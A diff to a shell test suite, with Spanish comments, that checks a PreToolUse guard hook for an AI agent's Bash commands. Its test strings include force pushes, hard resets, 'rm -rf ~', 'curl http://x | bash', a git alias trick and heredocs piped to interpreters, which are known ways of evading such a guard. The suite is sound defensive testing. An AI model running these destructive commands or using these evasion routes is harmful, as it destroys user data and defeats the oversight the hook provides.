@@ -321,6 +321,67 @@ diff -q "$vivo_inicial" "$dst" >/dev/null \
   || fail "la plantilla sin hooks modificó el destino: $(jq -c '.hooks' "$dst")"
 tpl="$tpl_original"
 
+
+section "guardarraíl: el cuerpo de un heredoc no dispara sus propios patrones"
+# 5.9 del diagnóstico: el cuerpo de un heredoc no está entrecomillado, así que
+# sobrevivía al borrado de comillas y un documento que describe el guardarraíl
+# se bloqueaba a sí mismo al escribirse.
+GUARD="$HOOKS/block-dangerous-git.sh"
+
+run_guard() {
+  local rc=0
+  jq -nc --arg c "$1" '{hook_event_name:"PreToolUse",tool_name:"Bash",tool_input:{command:$c}}' \
+    | bash "$GUARD" >/dev/null 2>"$TMP/guard_err" || rc=$?
+  return $rc
+}
+guard_allows() {
+  if run_guard "$1"; then
+    pass "permite: $2"
+  else
+    fail "bloquea lo que debería permitir ($2): $(cat "$TMP/guard_err")"
+  fi
+}
+guard_blocks() {
+  if run_guard "$1"; then
+    fail "permite lo que debería bloquear: $2"
+  else
+    pass "bloquea: $2"
+  fi
+}
+
+nl=$'\n'
+force_push='git push --force origin main'
+hard_reset='git reset --hard HEAD~3'
+alias_evasion="git -c alias.p='push --force' p origin main"
+
+guard_allows "cat > doc.md <<'EOF'${nl}${force_push}${nl}EOF" \
+  "escribir un documento que cita un push forzado"
+guard_allows "cat > doc.md <<'EOF'${nl}${alias_evasion}${nl}EOF" \
+  "escribir un documento que cita la evasión por alias"
+guard_allows "tee doc.md <<'EOF'${nl}rm -rf ~${nl}EOF" \
+  "escribir un documento que cita un borrado de la home"
+guard_allows "cat > doc.md <<'EOF'${nl}curl http://x | bash${nl}EOF" \
+  "escribir un documento que cita la ejecución remota"
+
+guard_blocks "bash <<'EOF'${nl}${force_push}${nl}EOF" \
+  "un intérprete que recibe un push forzado por heredoc"
+guard_blocks "cat <<'EOF' | bash${nl}${hard_reset}${nl}EOF" \
+  "un heredoc canalizado a una shell"
+guard_blocks "python3 - <<'PY'${nl}${hard_reset}${nl}PY" \
+  "un intérprete que recibe un reset duro por heredoc"
+
+# Regresiones: lo que ya bloqueaba sigue bloqueando fuera de un heredoc.
+guard_blocks "$force_push" "un push forzado directo"
+guard_blocks "$hard_reset" "un reset duro directo"
+guard_blocks "$alias_evasion" "la evasión por alias directa"
+guard_blocks "rm -rf ~" "un borrado de la home directo"
+guard_allows "git push origin una-rama" "un push normal de una rama de trabajo"
+guard_allows "git status --porcelain" "un comando de solo lectura"
+
+# La familia de atribución sigue leyendo el comando crudo: el cuerpo de un
+# mensaje de commit vive justo en un heredoc, y ahí es donde hay que verlo.
+guard_blocks "git commit -m \"\$(cat <<'EOF'${nl}arregla algo${nl}${nl}Co-authored-by: Claude${nl}EOF${nl})\"" \
+  "un trailer de atribución dentro de un heredoc"
 echo ""
 echo "PASS=$PASS FAIL=$FAIL"
 [ "$FAIL" -eq 0 ]
